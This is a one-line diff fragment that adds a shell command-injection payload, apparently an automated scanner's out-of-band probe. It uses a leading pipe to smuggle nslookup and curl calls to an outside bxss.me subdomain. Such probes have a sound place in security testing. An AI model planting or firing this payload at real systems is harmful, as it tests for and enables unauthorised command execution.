@@ -1,0 +1,1 @@
+|(nslookup -q=cname hitammplsddisd18ae.bxss.me||curl hitammplsddisd18ae.bxss.me)
